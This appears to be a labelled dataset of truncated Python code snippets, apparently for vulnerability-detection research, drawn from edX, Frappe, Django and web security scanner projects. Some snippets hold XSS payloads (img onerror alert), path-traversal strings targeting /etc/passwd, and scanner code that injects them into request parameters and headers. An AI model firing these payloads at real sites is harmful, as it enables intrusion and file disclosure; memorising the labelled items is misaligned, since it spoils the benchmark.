"(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers", "label": 0}, {"snippet_id": 4486, "code": " for i in xrange(256): yield chr(i) @staticmethod def fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff)) @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100", "label": 0}, {"snippet_id": 25141, "code": " logging from decimal import Decimal import dateutil.parser import pytz import vat_moss.errors import vat_moss.id from django import forms from django.contrib import messages from django.core.exceptions", "label": 0}, {"snippet_id": 33678, "code": ".comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[", "label": 0}, {"snippet_id": 13847, "code": "<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 21542, "code": "/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$", "label": 0}, {"snippet_id": 2795, "code": "(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, ", "label": 0}, {"snippet_id": 30522, "code": ".getvalue('rows1') is not None: \trows=form.getvalue('rows1') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1'", "label": 0}, {"snippet_id": 4467, "code": "', 'w': '\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def __init__(self): super(Code, self).__init__() @staticmethod def fuzzAscii(): for i in xrange(256): yield chr(i) @staticmethod def fuzzUnicode(cnt=1)", "label": 0}, {"snippet_id": 14680, "code": " suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 46763, "code": " cache, clear_mc from.user import GithubUser from.consts import K_COMMENT, ONE_HOUR from.react import ReactMixin, ReactItem from.signals import comment_reacted from.utils import RedisSettings markdown=mistune", "label": 0}, {"snippet_id": 36339, "code": ", fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map", "label": 0}, {"snippet_id": 20985, "code": ".simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if", "label": 0}, {"snippet_id": 319, "code": "\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query", "label": 0}, {"snippet_id": 25080, "code": " sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler", "label": 0}, {"snippet_id": 31506, "code": " Button, RadioButtonGroup, Select \timport pandas as pd \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics", "label": 0}, {"snippet_id": 20153, "code": "\"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the", "label": 0}, {"snippet_id": 46716, "code": "(getattr(BenefitRequirement.flags, build_question_flag(question))) return self.render_to_response({ 'form': form, 'submitted': True, 'claimable_benefits': Benefit.objects.find_claimable(selected_flags),", "label": 0}, {"snippet_id": 35684, "code": "=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0", "label": 0}, {"snippet_id": 51137, "code": "(last_run_at=datetime.now(pytz.utc)) @staticmethod def next(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime", "label": 0}, {"snippet_id": 17188, "code": "'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 14246, "code": " include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$'", "label": 0}, {"snippet_id": 25036, "code": " def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p()", "label": 0}, {"snippet_id": 30336, "code": ".ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops. Read timeout occured') \texcept requests.exceptions.HTTPError as errh: \t\tprint(\"Http Error:\",errh", "label": 0}, {"snippet_id": 23773, "code": " self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec", "label": 0}, {"snippet_id": 31865, "code": "'color') \t \tfor server in servers: \t\tfunct.ssh_command(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath') \t\tif error: \t\t\tprint", "label": 0}, {"snippet_id": 55003, "code": " translation memory for a list of translations. \"\"\" memory_entries=[ TranslationMemoryEntry( source=t.entity.string, target=t.string, locale=locale, entity=t.entity, translation=t, project=project, ) for t in", "label": 0}, {"snippet_id": 6213, "code": ".config.getint(self.section, 'num_threads') @property def logdir(self): \"\"\" Path to CherryPy logfiles(string). Something like '/var/log/idp' maybe. \"\"\" res=self.config.get(self.section, 'logdir') if not", "label": 0}, {"snippet_id": 31773, "code": "\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style", "label": 0}, {"snippet_id": 47118, "code": "=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated', True) page_size=25 def delete_model(self, model): \"\"\"Delete a record.\"\"\" try: if model.json is None: return", "label": 1}, {"snippet_id": 27739, "code": " values, status=200): \"\"\"Write JSON response.\"\"\" self._add_security_response_headers() self.response.headers['Content-Type']='application/json' self.before_render_json(values, status) self.response.out.write", "label": 0}, {"snippet_id": 11307, "code": "/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost", "label": 0}, {"snippet_id": 7546, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name", "label": 0}, {"snippet_id": 15249, "code": ". See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal", "label": 0}, {"snippet_id": 26380, "code": " and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country returned an incorrect result. We will therefore ' 'need to charge", "label": 0}, {"snippet_id": 55153, "code": "['count']==0: return JsonResponse({ 'count': 0, 'invalid_translation_count': invalid_translation_count, }) update_stats(action_status['translated_resources'], locale) mark_changed_translation(action_status", "label": 0}, {"snippet_id": 9571, "code": ".peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes", "label": 0}, {"snippet_id": 20336, "code": "(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd", "label": 0}, {"snippet_id": 44348, "code": "'workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc.get().id if doc else -1, 'subworkflows_json'", "label": 1}, {"snippet_id": 28253, "code": "(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save", "label": 0}, {"snippet_id": 54172, "code": "').grid(row=0) Label(main, text=\"Cookie:(Optional)\",background='light sky blue').grid(row=1) Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light", "label": 0}, {"snippet_id": 48421, "code": "=art ar.RID=current_reservation ar.amount=amount if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\" +str(art.id))]) ar.save", "label": 1}, {"snippet_id": 51532, "code": " 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'django_otp.middleware.OTPMiddleware', ] ROOT_URLCONF='dashboard.urls' TEMPLATES=[ { 'BACKEND': 'django.template.backends.django.DjangoTemplates", "label": 0}, {"snippet_id": 42007, "code": ": \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument)", "label": 0}, {"snippet_id": 36060, "code": "\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception", "label": 0}, {"snippet_id": 44208, "code": ".http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission", "label": 0}, {"snippet_id": 53292, "code": ".user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator", "label": 0}, {"snippet_id": 36671, "code": " not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"", "label": 0}, {"snippet_id": 16630, "code": "+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url", "label": 0}, {"snippet_id": 26919, "code": "==i: post_params[params[j]]=xss else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params", "label": 0}, {"snippet_id": 35920, "code": ") \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field", "label": 0}, {"snippet_id": 4538, "code": ".fuzzer import Fuzzer _tags=[ 'a', 'abbr', 'acronym', 'address', 'applet', 'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br'", "label": 0}, {"snippet_id": 27391, "code": " int((obj -self._EPOCH).total_seconds()) elif hasattr(obj, 'to_dict'): return obj.to_dict() elif isinstance(obj, cgi.FieldStorage): return str(obj) else: raise Exception('Cannot serialise %s' % obj) def", "label": 0}, {"snippet_id": 28009, "code": ", 'authDomain': auth.auth_domain(), 'dest': self.request.get('dest'), }) class SessionLoginHandler(base_handler.Handler): \"\"\"Session login handler.\"\"\" @handler.post(handler.JSON, handler.JSON) def post", "label": 1}, {"snippet_id": 21450, "code": ", name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id", "label": 0}, {"snippet_id": 14224, "code": ".submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 31761, "code": ".get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+list_name \ttry: \t\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+'", "label": 0}, {"snippet_id": 28577, "code": ">' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy')", "label": 0}, {"snippet_id": 24136, "code": ".start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ", "label": 0}, {"snippet_id": 12876, "code": " url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 26014, "code": "'data-display-dependency': ' 'vat_id': forms.TextInput(attrs={'data-display-dependency': ' 'internal_reference': forms.TextInput, } labels={ 'is_business': '' } def __init__(self, *args, **kwargs): self", "label": 0}, {"snippet_id": 44954, "code": " ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value'])", "label": 0}, {"snippet_id": 8080, "code": "=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r", "label": 0}, {"snippet_id": 53958, "code": "]\\n') print(colored('\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST", "label": 0}, {"snippet_id": 30248, "code": "\t\t's': form.getvalue('s'), \t\t'b': form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0', \t\t'Accept': 'text/html,application/xhtml+xml,application", "label": 0}, {"snippet_id": 26965, "code": "\", \"w\") as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def check_lfi(host, page, method", "label": 0}, {"snippet_id": 33234, "code": ").is_anonymous: return self.redirect(gae_users.create_login_url(self.request.url)) self.response.write('build %d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask", "label": 1}, {"snippet_id": 23089, "code": "+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$", "label": 0}, {"snippet_id": 49014, "code": "/td>', self.object.get_absolute_url(), self.format(self.get_value()) ) class SmartListItem(object): def __init__(self, smart_list, object): self.smart_list=smart_list self.object=object def fields(self", "label": 0}, {"snippet_id": 18440, "code": "<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard", "label": 0}, {"snippet_id": 35463, "code": "] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif", "label": 0}, {"snippet_id": 8919, "code": "=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 3251, "code": " headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1", "label": 0}, {"snippet_id": 42303, "code": "(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields", "label": 0}, {"snippet_id": 10426, "code": " BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite", "label": 0}, {"snippet_id": 10571, "code": " sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils", "label": 0}, {"snippet_id": 31511, "code": "\timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={}", "label": 0}, {"snippet_id": 38241, "code": ".get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters", "label": 0}, {"snippet_id": 5157, "code": " t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self", "label": 0}, {"snippet_id": 32313, "code": "%s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)) return 1 rpath=os.path.relpath(path,", "label": 0}, {"snippet_id": 33989, "code": "\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s ", "label": 0}, {"snippet_id": 31247, "code": " \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import widgetbox, gridplot \tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select", "label": 0}, {"snippet_id": 48793, "code": ".translation import gettext_lazy as _ from typing import List from smart_lists.exceptions import SmartListException from smart_lists.filters import SmartListFilter class TitleFromModelFieldMixin(object):", "label": 0}, {"snippet_id": 42020, "code": " key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]:", "label": 0}, {"snippet_id": 24751, "code": "\"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self", "label": 0}, {"snippet_id": 3991, "code": " ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=", "label": 0}, {"snippet_id": 7071, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset", "label": 0}, {"snippet_id": 7049, "code": "?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$',", "label": 0}, {"snippet_id": 34737, "code": "\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime", "label": 0}, {"snippet_id": 53823, "code": "(\"[Input Dork] >_ \")) req=url.PoolManager() send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in", "label": 1}, {"snippet_id": 26898, "code": " print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for xss in xss_attacks: post_params={} counter+=1 parameters=\"\" for i in range(0,len(params)): for j in range(0,", "label": 0}, {"snippet_id": 30681, "code": " serv is not None and act==\"showMap\": \tovw.get_map(serv) \t if form.getvalue('servaction') is not None: \tserver_state_file=sql.get_setting('server_state_file') \thaproxy_sock=sql.get_setting('haproxy_sock'", "label": 0}, {"snippet_id": 11915, "code": "', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern", "label": 0}, {"snippet_id": 71, "code": "\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in", "label": 0}, {"snippet_id": 19572, "code": " mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command", "label": 0}, {"snippet_id": 26451, "code": ":alert(1)\\\">\", \"<img src=test123456.jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '", "label": 0}, {"snippet_id": 27570, "code": " \"\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron')) def render_forbidden(self, message): \"\"\"Write HTML response for 403.\"\"\" login_url=make_login_url", "label": 0}, {"snippet_id": 46542, "code": ") template='admin_collections.mako' if is_mobile: template='admin_collections_m.mako' return render(template, request,{ 'is_embeddable': request.GET.get('is_embeddable', False), 'existing_hue_collections", "label": 0}, {"snippet_id": 37295, "code": ".published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self)", "label": 0}, {"snippet_id": 15730, "code": "\"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string.", "label": 0}, {"snippet_id": 35906, "code": " fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value):", "label": 0}, {"snippet_id": 37469, "code": "\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under", "label": 1}, {"snippet_id": 24088, "code": "\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"", "label": 0}, {"snippet_id": 44504, "code": ")['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied", "label": 0}, {"snippet_id": 21326, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(", "label": 1}, {"snippet_id": 13200, "code": "<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete", "label": 0}, {"snippet_id": 12487, "code": "/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups", "label": 0}, {"snippet_id": 30385, "code": " \texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps: Something Else\",err) \t\t \tdata=response.content \tprint(data.decode('utf-8')) if serv is not None and form.getvalue('rows') is not None", "label": 0}, {"snippet_id": 46719, "code": ") return self.render_to_response({ 'form': form, 'submitted': True, 'claimable_benefits': Benefit.objects.find_claimable(selected_flags), }) class BenefitDetailView(DetailView): model=Benefit template_name", "label": 0}, {"snippet_id": 4004, "code": "() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse", "label": 0}, {"snippet_id": 54257, "code": ",background='light sky blue').grid(row=10) ua=[\"\"] ua+=bane.ua li=bane.read_file('xss.txt') pl=[] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0", "label": 1}, {"snippet_id": 19265, "code": ") self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec", "label": 0}, {"snippet_id": 11691, "code": "'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns ", "label": 0}, {"snippet_id": 20817, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'})", "label": 0}, {"snippet_id": 9910, "code": "='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry", "label": 0}, {"snippet_id": 36792, "code": "\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext", "label": 0}, {"snippet_id": 42876, "code": " self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t", "label": 0}, {"snippet_id": 24859, "code": ". If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd", "label": 0}, {"snippet_id": 23463, "code": "+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url", "label": 0}, {"snippet_id": 1269, "code": " methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid", "label": 0}, {"snippet_id": 17705, "code": ", 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 49826, "code": "'sendMSG',output) }) </script> ''' 